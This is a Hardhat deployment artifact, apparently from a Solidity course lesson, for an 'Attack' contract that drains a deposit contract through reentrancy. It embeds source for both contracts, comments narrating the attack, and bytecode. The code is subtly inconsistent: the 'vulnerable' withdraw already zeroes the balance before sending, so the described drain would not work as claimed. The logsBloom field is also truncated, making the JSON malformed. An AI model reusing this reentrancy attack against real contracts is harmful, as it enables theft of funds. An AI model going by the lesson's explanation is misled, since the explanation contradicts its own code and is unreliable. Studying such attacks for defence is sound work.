{
  "address": "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_reentrantVulnerable",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "reentrantVulnerable",
      "outputs": [
        {
          "internalType": "contract ReentrantVulnerable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "transactionHash": "0x9f9bbe74e481803318edd8e77a5c060e454553365bbcd068c0c8c1b0f6f13757",
  "receipt": {
    "to": null,
    "from": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "contractAddress": "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
    "transactionIndex": 0,
    "gasUsed": "279523",
    "logsBloom": "0x
    "blockHash": "0xc0fb09c3aa46cdbc1ef63db07cbe2cce849804b0f5400a0de2be7cde82bfbdac",
    "transactionHash": "0x9f9bbe74e481803318edd8e77a5c060e454553365bbcd068c0c8c1b0f6f13757",
    "logs": [],
    "blockNumber": 2,
    "cumulativeGasUsed": "279523",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x5FbDB2315678afecb367f032d93F642f64180aa3"
  ],
  "numDeployments": 1,
  "solcInputHash": "8893bc4ecd369ac8a855b474bab54002",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_reentrantVulnerable\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reentrantVulnerable\",\"outputs\":[{\"internalType\":\"contract ReentrantVulnerable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/sublesson/reentrancyAttack.sol\":\"Attack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/sublesson/reentrancyAttack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.7;\\n\\ncontract ReentrantVulnerable {\\n    mapping(address => uint256) public balances;\\n\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n// easy way\\n// mutex lock using openZeppeline\\n    function withdraw() payable public {\\n        uint256 bal = balances[msg.sender];\\n        require(bal > 0);\\n        balances[msg.sender] = 0;\\n        (bool sent, ) = msg.sender.call{value: bal}(\\\"\\\");\\n        require(sent, \\\"Failed to send Ether\\\");\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\\ncontract Attack {\\n    ReentrantVulnerable public reentrantVulnerable;\\n\\n    constructor(address _reentrantVulnerable) {\\n        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);\\n    }\\n\\n    function attack() external payable {\\n        reentrantVulnerable.deposit{value: 1 ether}();\\n        reentrantVulnerable.withdraw();\\n    }\\n\\n    fallback() external payable {\\n        if (address(reentrantVulnerable).balance >= 1 ether) {\\n            reentrantVulnerable.withdraw();\\n        }\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\\n//1. Let say you are Alice and you have deposited 100ETH in the contract\\n//2. Now Bob want to attack the contract then he deploy the Attack contract by passing the address of the\\n// contract where Alice's ETH is stored.\\n//3. Now Bob will use the attack function.\\n// FLOW OF ATTACK FUNCTION\\n// -> Calls the deposit function and deposit 1ETH because the balance should be 1ETH so that the withdraw function will work.\\n// -> After depositing 1ETH the attack function will call withdraw function.\\n// -> In the First Contract Withdraw function first check if the deposit of the caller is more than 0ETH.\\n// -> then withdraw function runs the msg.sender.call function which is the worst problem.\\n// -> this msg.sender.call is calling the contract from where is hasbeen called then in the attack contract that call be be handled by\\n//    the fallback function, and that fallback function again call the withdraw function then this recursion goes on and on which causes \\n// loosing of all the money from the contarct. and balance of attacked contract be become zero.\\n\\n// #######Best practice is to first update the balance to zero then transfer the funds############//\",\"keccak256\":\"0x436cd3fd58dbf99f5647e27b3d8119c78dc0842b3441eecef57bfa5455621d80\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506040516104b43803806104b4833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61039d806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe01461010257806333684a051461012d5780639e5faafc1461015857610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101005760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b505050505b005b34801561010e57600080fd5b50610117610162565b60405161012491906102b2565b60405180910390f35b34801561013957600080fd5b5061014261016a565b60405161014f919061034c565b60405180910390f35b61016061018e565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101fe57600080fd5b505af1158015610212573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561027f57600080fd5b505af1158015610293573d6000803e3d6000fd5b50505050565b6000819050919050565b6102ac81610299565b82525050565b60006020820190506102c760008301846102a3565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061031261030d610308846102cd565b6102ed565b6102cd565b9050919050565b6000610324826102f7565b9050919050565b600061033682610319565b9050919050565b6103468161032b565b82525050565b6000602082019050610361600083018461033d565b9291505056fea2646970667358221220118e92cd0734297cf329904dcb1d215eca6cb82f561f6b99821e8295415f20d464736f6c63430008110033",
  "deployedBytecode": "0x6080604052600436106100385760003560e01c806312065fe01461010257806333684a051461012d5780639e5faafc1461015857610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101005760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b505050505b005b34801561010e57600080fd5b50610117610162565b60405161012491906102b2565b60405180910390f35b34801561013957600080fd5b5061014261016a565b60405161014f919061034c565b60405180910390f35b61016061018e565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101fe57600080fd5b505af1158015610212573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561027f57600080fd5b505af1158015610293573d6000803e3d6000fd5b50505050565b6000819050919050565b6102ac81610299565b82525050565b60006020820190506102c760008301846102a3565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061031261030d610308846102cd565b6102ed565b6102cd565b9050919050565b6000610324826102f7565b9050919050565b600061033682610319565b9050919050565b6103468161032b565b82525050565b6000602082019050610361600083018461033d565b9291505056fea2646970667358221220118e92cd0734297cf329904dcb1d215eca6cb82f561f6b99821e8295415f20d464736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 3182,
        "contract": "contracts/sublesson/reentrancyAttack.sol:Attack",
        "label": "reentrantVulnerable",
        "offset": 0,
        "slot": "0",
        "type": "t_contract(ReentrantVulnerable)3179"
      }
    ],
    "types": {
      "t_contract(ReentrantVulnerable)3179": {
        "encoding": "inplace",
        "label": "contract ReentrantVulnerable",
        "numberOfBytes": "20"
      }
    }
  }
}